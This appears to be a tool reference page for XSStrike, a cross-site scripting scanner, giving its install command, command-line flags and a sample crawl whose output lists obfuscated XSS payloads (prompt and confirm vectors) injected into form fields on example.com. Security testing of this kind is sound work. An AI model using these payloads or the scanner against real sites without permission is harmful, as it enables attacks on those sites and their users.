---
title : "XSStrike"
# pre : ' '
description : "XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler."
date : 2020-08-28T12:45:17+02:00
# hidden : true
# draft : true
weight : 2090
# tags : ['']
---

---

XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler.

## Installation

```plain
git clone https://github.com/s0md3v/XSStrike.git
```

## Usage

```plain
xsstrike.py [-h] [-u target] [--data paramdata] [-e encode] [--fuzzer] [--update] [--timeout timeout] [--proxy] [--params] [--crawl] [--json] [--path] [--seeds args_seeds] [-f args_file] [-l level] [--headers [add_headers]] [-t threadcount] [-d delay] [--skip] [--skip-dom]
                   [--blind] [--console-log-level {debug,info,run,good,warning,error,critical,vuln}] [--file-log-level {debug,info,run,good,warning,error,critical,vuln}] [--log-file log_file]
```

## Flags

```plain
optional arguments:
  -h, --help            show this help message and exit
  -u target, --url target
                        url
  --data paramdata      post data
  -e encode, --encode encode
                        encode payloads
  --fuzzer              fuzzer
  --update              update
  --timeout timeout     timeout
  --proxy               use prox(y|ies)
  --params              find params
  --crawl               crawl
  --json                treat post data as json
  --path                inject payloads in the path
  --seeds args_seeds    load crawling seeds from a file
  -f args_file, --file args_file
                        load payloads from a file
  -l level, --level level
                        level of crawling
  --headers [add_headers]
                        add headers
  -t threadcount, --threads threadcount
                        number of threads
  -d delay, --delay delay
                        delay between requests
  --skip                don't ask to continue
  --skip-dom            skip dom checking
  --blind               inject blind xss payload while crawling
  --console-log-level {debug,info,run,good,warning,error,critical,vuln}
                        console logging level
  --file-log-level {debug,info,run,good,warning,error,critical,vuln}
                        file logging level
  --log-file log_file   name of the file to log
```

## Examples

```plain
$ ./xsstrike.py -u 'https://www.example.com/zoeken/\?value\=test' --crawl

XSStrike v3.1.4

[~] Crawling the target
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for Salutation: <hTmL%0dONPOINTeReNTer%0d=%0da=prompt,a()%0dx//
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for Initials: <A%09OnMOUSEoVEr%0a=%0a(prompt)``%0dx//v3dm0s
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for Insertion: <D3v%0dOnMoUsEoVEr%0a=%0a(prompt)``//v3dm0s
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for LastName: <htML%0doNPOINTEreNTeR+=+confirm()%0dx//
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for EmailAddress: <d3v%0doNMouSEoVer+=+(prompt)``//v3dm0s
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for PhoneNumber: <A/+/oNMOuSeOVeR%09=%09confirm()//v3dm0s
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for CustomerNumber: <htMl%0dOnMouSEoVer%0a=%0a[8].find(confirm)//
[++] Vulnerable webpage: https://www.example.com/umbraco/Surface/Form/Post
[++] Vector for Subject: <D3v%09onmOUsEoVEr+=+confirm()//v3dm0s
```

## URL List

- [GitHub.com - XSStrike](https://github.com/s0md3v/XSStrike)
